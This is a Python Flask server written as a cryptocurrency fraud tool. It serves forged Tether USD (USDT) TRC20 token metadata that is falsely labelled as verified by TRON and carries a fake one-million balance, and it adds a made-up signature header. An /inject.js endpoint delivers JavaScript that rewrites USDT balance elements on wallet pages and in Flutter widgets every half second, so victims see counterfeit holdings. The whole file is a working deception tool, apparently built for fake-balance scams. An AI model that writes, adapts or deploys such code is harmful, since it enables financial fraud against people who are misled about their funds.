from flask import Flask, jsonify, request
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import base64
import hashlib

app = Flask(__name__)
CORS(app)
limiter = Limiter(app=app, key_func=get_remote_address, default_limits=["200 per minute"])

PROXY_ADDRESS = "TRu5tU5DT..."  # TODO: Deploy sonrası TokenProxy.sol adresi
REAL_USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
FAKE_BALANCE = 1000000 * 10**6

def get_exploit_metadata():
    return {
        "name": "Tether USD",
        "symbol": "USDT",
        "contract": REAL_USDT_ADDRESS,
        "decimals": 6,
        "verified": True,
        "logoURI": "https://cdn.tron.network/usdt_1.png",
        "explorer": f"https://tronscan.org/#/contract/{REAL_USDT_ADDRESS}",
        "tags": ["stablecoin", "TRC20", "verified"],
        "contractType": "TRC20",
        "verifiedBy": "TRON",
        "balance": FAKE_BALANCE
    }

@app.route('/api/v1/token', methods=['GET'])
@limiter.limit("200 per minute")
def exploit_token_info():
    contract_param = request.args.get("contract")
    if contract_param and contract_param != REAL_USDT_ADDRESS:
        return jsonify({"error": "Invalid contract"}), 400
    response = get_exploit_metadata()
    return jsonify(response), 200, {
        "Content-Type": "application/json; charset=utf-8",
        "X-Tron-Signature": hashlib.sha256(str(response).encode()).hexdigest()
    }

@app.route('/inject.js', methods=['GET'])
def inject_script():
    amount = request.args.get('amount', FAKE_BALANCE)
    js_code = f"""
    (function() {{
        function manipulateBalance() {{
            const selectors = [
                '[data-token="USDT"]',
                '.balance',
                '.token-amount',
                '.asset-row',
                '[data-coin-id="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"]',
                '.wallet-balance',
                '.token-balance',
                '.flutter-text', // Flutter Text widget’ları için
                '[data-flutter-id*="USDT"]'
            ];
            selectors.forEach(sel => {{
                document.querySelectorAll(sel).forEach(el => {{
                    if (el.textContent.includes('USDT') || el.dataset.token === 'USDT' || el.dataset.coinId === 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t') {{
                        el.textContent = '{int(amount) / 10**6} USDT';
                        el.setAttribute('data-balance', '{amount}');
                    }}
                }});
            }});
        }}
        document.addEventListener('DOMContentLoaded', manipulateBalance);
        setInterval(manipulateBalance, 500);
    }})();
    """
    return js_code, 200, {"Content-Type": "application/javascript"}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443, ssl_context=('cert.pem', 'key.pem'))